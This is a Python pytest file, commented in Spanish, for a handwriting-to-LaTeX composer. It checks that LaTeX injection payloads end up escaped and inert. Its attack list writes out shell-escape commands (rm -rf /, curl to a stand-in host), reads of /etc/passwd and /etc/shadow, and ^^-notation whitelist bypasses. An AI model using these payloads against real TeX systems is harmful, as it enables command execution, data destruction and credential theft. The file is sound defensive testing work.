import shutil

import pytest

from ctex.composicion.compositor import componer


def documento_con_ecuacion(latex: str) -> dict:
    return {
        "version_contrato": "1.0",
        "origen": {"archivo": "ataque.jpg", "pagina": 1},
        "bloques": [{
            "id": "b1",
            "tipo": "ecuacion",
            "region": {"x": 0, "y": 0, "ancho": 10, "alto": 10},
            "confianza": 0.99,
            "contenido": {"latex": latex, "numerada": True},
        }],
        "dudas": [],
    }


def documento_con_parrafo(texto: str) -> dict:
    documento = documento_con_ecuacion("x=1")
    documento["bloques"][0]["tipo"] = "parrafo"
    documento["bloques"][0]["contenido"] = {"texto": texto}
    return documento


ATAQUES = [
    r"\write18{rm -rf /}",
    r"\input{/etc/passwd}",
    r"\include{/etc/shadow}",
    r"\def\x{\x\x}\x",
    r"\csname write\endcsname18{ls}",
    r"\openout1=/tmp/robado.txt",
    r"\catcode`\@=11",
    r"\immediate\write18{curl http://malo.example}",
    # Notacion ^^ de TeX: el comando se construye sin escribir su nombre, asi
    # que la lista blanca de comandos no lo ve. Encontrado el 2026-07-25 y
    # verificado compilando: `\^^73ection{X}` produjo una seccion real (D32).
    r"\^^77rite18{ls}",
    r"\^^69nput{/etc/passwd}",
    r"\^^^^0077rite18{ls}",
]


@pytest.mark.parametrize("ataque", ATAQUES)
def test_un_ataque_en_una_ecuacion_no_llega_al_tex(ataque):
    tex, _ = componer(documento_con_ecuacion(ataque))
    assert r"\write18" not in tex
    assert r"\input{" not in tex
    assert r"\openout" not in tex
    assert r"\csname" not in tex
    assert r"\def\x" not in tex
    # Ningun fragmento con notacion ^^ llega vivo al .tex: si el atacante la
    # uso, el bloque se degrado y los acentos salieron escapados.
    assert "^^" not in tex


@pytest.mark.parametrize("ataque", ATAQUES)
def test_un_ataque_en_un_parrafo_no_llega_al_tex(ataque):
    # El caso de la Seccion 9: alguien escribe el ataque a mano en el cuaderno
    # y el reconocedor lo transcribe como prosa.
    tex, _ = componer(documento_con_parrafo(ataque))
    assert r"\write18" not in tex
    assert r"\input{" not in tex


def test_el_texto_del_ataque_si_aparece_pero_inerte():
    # No se borra la evidencia: el usuario ve lo que escribio, sin que se ejecute.
    tex, _ = componer(documento_con_parrafo(r"\write18{ls}"))
    assert "write18" in tex
    assert r"\textbackslash{}write18" in tex


@pytest.mark.skipif(shutil.which("tectonic") is None, reason="Tectonic no instalado")
@pytest.mark.parametrize("ataque", ATAQUES)
def test_un_documento_con_ataque_compila_igual(ataque, tmp_path):
    # D18: el motor siempre entrega un PDF. Un ataque se degrada, no revienta.
    from ctex.compilacion.tectonic import compilar

    tex, _ = componer(documento_con_ecuacion(ataque))
    pdf = compilar(tex, tmp_path)
    assert pdf.exists()
